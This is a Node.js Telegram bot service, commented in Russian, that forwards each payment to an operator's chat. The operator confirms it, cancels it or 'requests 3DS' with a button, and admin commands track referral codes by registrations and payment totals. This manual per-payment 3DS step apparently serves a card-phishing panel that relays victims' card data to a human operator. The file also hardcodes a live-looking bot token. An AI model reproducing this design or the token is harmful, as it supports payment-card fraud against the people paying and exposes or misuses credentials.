const TelegramBot = require('node-telegram-bot-api');


class BotService {
    constructor() {
        this.bot = new TelegramBot("8216977215:AAEqwBaREu4vZvz4yj6d5ICZp5xgyZ8vQjY", { polling: true });
        this.pendingCallbacks = new Map();
        this.ADMIN_CHAT_ID = 7209588642; // ID администратора
        
        // Удаляем webhook если он установлен
        this.bot.deleteWebHook().then(() => {
            console.log('Webhook удален, используется polling');
        }).catch(err => {
            console.log('Ошибка при удалении webhook:', err.message);
        });

        // Регистрируем команды для управления рефералами
        this.registerCommands();
        
        // Глобальный обработчик для всех callback'ов
        this.bot.on('callback_query', async (callbackQuery) => {
            const messageId = callbackQuery.message.message_id;
            const chatId = callbackQuery.message.chat.id;
            
            console.log('Получен callback:', { messageId, data: callbackQuery.data });
            console.log('Доступные messageId в pendingCallbacks:', Array.from(this.pendingCallbacks.keys()));
            
            if (this.pendingCallbacks.has(messageId)) {
                const { resolve, timeout, originalMessage } = this.pendingCallbacks.get(messageId);
                clearTimeout(timeout);
                this.pendingCallbacks.delete(messageId);
                
                if (callbackQuery.data === 'confirm') {
                    console.log('>>> НАЖАТА КНОПКА ПОДТВЕРДИТЬ <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Платеж подтвержден' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\n✅ Статус: ПОДТВЕРЖДЕН`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('Отправляю результат: { confirmed: true }');
                    resolve({ confirmed: true });
                } else if (callbackQuery.data === 'request_3ds') {
                    console.log('>>> НАЖАТА КНОПКА 3DS <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '🔐 Запрос 3DS верификации' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\n🔐 Статус: ОЖИДАНИЕ 3DS ВЕРИФИКАЦИИ`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('Отправляю результат: { requires3DS: true }');
                    resolve({ requires3DS: true });
                } else if (callbackQuery.data === 'cancel') {
                    console.log('>>> НАЖАТА КНОПКА ОТМЕНИТЬ <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Платеж отменен' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\n❌ Статус: ОТМЕНЕН`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('Отправляю результат: { confirmed: false, reason: "cancelled" }');
                    resolve({ confirmed: false, reason: 'cancelled' });
                }
            } else {
                console.log('Callback для messageId не найден в pendingCallbacks');
            }
        });
    }

    async sendMessageAndWait(chatId, message, buttonPayment) {
        // Генерируем уникальный временный ID для этого запроса
        const tempId = `_pending_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Создаем Promise для ожидания ответа
        const waitPromise = new Promise((resolve) => {
            const timeout = setTimeout(() => {
                // Удаляем из обеих возможных мест (временный и реальный ID)
                this.pendingCallbacks.delete(tempId);
                console.log('Таймаут ожидания подтверждения');
                resolve({ confirmed: false, reason: 'timeout' });
            }, 300000); // 5 минут таймаут
            
            // Сохраняем с уникальным временным ключом
            this.pendingCallbacks.set(tempId, { resolve, timeout, originalMessage: message });
        });

        // Отправляем сообщение
        const sentMessage = await this.bot.sendMessage(chatId, message, buttonPayment);
        const messageId = sentMessage.message_id;
        console.log('Сообщение отправлено в Telegram, messageId:', messageId);
        
        // Заменяем временную запись на реальную с messageId
        const pendingData = this.pendingCallbacks.get(tempId);
        if (pendingData) {
            this.pendingCallbacks.delete(tempId);
            this.pendingCallbacks.set(messageId, pendingData);
            console.log('Ожидание подтверждения для messageId:', messageId);
        } else {
            console.error('ОШИБКА: Не найдены данные для tempId:', tempId);
        }

        return waitPromise;
    }

    registerCommands() {
        const referralService = require('./referral-service');

        // Команда /refstats - статистика по коду
        this.bot.onText(/\/refstats (.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const code = match[1].trim().toUpperCase();
            try {
                const stats = await referralService.getReferralStats(code);
                const message = this.formatReferralStats(stats);
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Ошибка: ${error.message}`);
            }
        });

        // Команда /reflink - получить ссылку для кода
        this.bot.onText(/\/reflink (.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const code = match[1].trim().toUpperCase();
            const ReferralCodeModel = require('../models/referral-code-model');
            
            try {
                const referralCode = await ReferralCodeModel.findOne({ code });
                
                if (!referralCode) {
                    await this.bot.sendMessage(msg.chat.id, `❌ Код <b>${code}</b> не найден`, { parse_mode: 'HTML' });
                    return;
                }
                
                const siteUrl = process.env.CLIENT_URL || 'http://localhost:3000';
                const referralLink = `${siteUrl}/?ref=${code}`;
                const status = referralCode.isActive ? '✅ Активен' : '❌ Неактивен';
                
                const message = `🔗 <b>Реферальная ссылка для кода: ${code}</b>\n\n` +
                    `<b>Название:</b> ${referralCode.name}\n` +
                    `<b>Статус:</b> ${status}\n\n` +
                    `<b>Ссылка:</b>\n<code>${referralLink}</code>\n\n` +
                    `<i>Скопируйте и используйте эту ссылку</i>`;
                
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Ошибка: ${error.message}`);
            }
        });

        // Команда /reflist - список всех кодов
        this.bot.onText(/\/reflist/, async (msg) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            try {
                const stats = await referralService.getAllStats();
                const message = this.formatAllReferralStats(stats);
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Ошибка: ${error.message}`);
            }
        });

        // Команда /refcreate - создать новый код
        this.bot.onText(/\/refcreate\s+(.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const args = match[1].trim().split(/\s+/);
            
            if (args.length < 2) {
                await this.bot.sendMessage(
                    msg.chat.id, 
                    `❌ Неправильный формат команды!\n\n<b>Использование:</b>\n/refcreate КОД НАЗВАНИЕ\n\n<b>Пример:</b>\n/refcreate PROMO2024 Акция Новый Год`, 
                    { parse_mode: 'HTML' }
                );
                return;
            }
            
            const code = args[0].toUpperCase();
            const name = args.slice(1).join(' ');
            
            try {
                await referralService.createReferralCode(code, name);
                
                const siteUrl = process.env.CLIENT_URL || 'http://localhost:3000';
                const referralLink = `${siteUrl}/?ref=${code}`;
                
                const message = `✅ Реферальный код создан!\n\n` +
                    `<b>Код:</b> ${code}\n` +
                    `<b>Название:</b> ${name}\n\n` +
                    `<b>🔗 Реферальная ссылка:</b>\n` +
                    `<code>${referralLink}</code>\n\n` +
                    `<i>Используйте эту ссылку для привлечения пользователей</i>`;
                
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Ошибка: ${error.message}`);
            }
        });

        // Команда /reftoggle - активировать/деактивировать код
        this.bot.onText(/\/reftoggle (.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const code = match[1].trim().toUpperCase();
            
            try {
                // Сначала получаем текущий статус
                const ReferralCodeModel = require('../models/referral-code-model');
                const currentCode = await ReferralCodeModel.findOne({ code });
                if (!currentCode) {
                    await this.bot.sendMessage(msg.chat.id, `❌ Код <b>${code}</b> не найден`, { parse_mode: 'HTML' });
                    return;
                }
                
                // Переключаем статус
                const referralCode = await referralService.toggleReferralCode(code, !currentCode.isActive);
                const status = referralCode.isActive ? '✅ активирован' : '❌ деактивирован';
                await this.bot.sendMessage(msg.chat.id, `Код <b>${code}</b> ${status}`, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Ошибка: ${error.message}`);
            }
        });

        // Команда /help - список команд
        this.bot.onText(/\/help/, async (msg) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const helpMessage = `
<b>📊 Команды управления рефералами:</b>

/refcreate CODE NAME - создать код
/reflink CODE - получить ссылку
/refstats CODE - статистика по коду
/reflist - список всех кодов
/reftoggle CODE - вкл/выкл код
/help - эта справка

<b>Примеры:</b>
/refcreate PROMO2024 Акция 2024
/reflink PROMO2024
/refstats PROMO2024
/reftoggle PROMO2024
            `;
            
            await this.bot.sendMessage(msg.chat.id, helpMessage, { parse_mode: 'HTML' });
        });
    }

    formatReferralStats(stats) {
        return `
<b>📊 Статистика по коду: ${stats.code}</b>

📌 Название: ${stats.name}
${stats.isActive ? '✅' : '❌'} Статус: ${stats.isActive ? 'Активен' : 'Неактивен'}

<b>Статистика:</b>
👥 Регистраций: ${stats.stats.totalRegistrations}
💳 Платежей: ${stats.stats.totalPayments}
💰 Сумма: ${stats.stats.totalAmount}
📈 Конверсия: ${stats.stats.conversionRate}
✅ Пользователей с платежами: ${stats.stats.usersWithPayments}
        `;
    }

    formatAllReferralStats(statsList) {
        if (!statsList || statsList.length === 0) {
            return '📊 <b>Реферальные коды не найдены</b>\n\nИспользуйте /refcreate для создания';
        }

        let message = '<b>📊 Все реферальные коды:</b>\n\n';
        
        statsList.forEach((stats, index) => {
            const status = stats.isActive ? '✅' : '❌';
            message += `${index + 1}. ${status} <b>${stats.code}</b> - ${stats.name}\n`;
            message += `   👥 ${stats.stats.totalRegistrations} рег. | 💳 ${stats.stats.totalPayments} платежей | 💰 ${stats.stats.totalAmount}\n\n`;
        });

        message += '\n<i>Используйте /refstats CODE для подробной информации</i>';
        
        return message;
    }
}

module.exports = new BotService();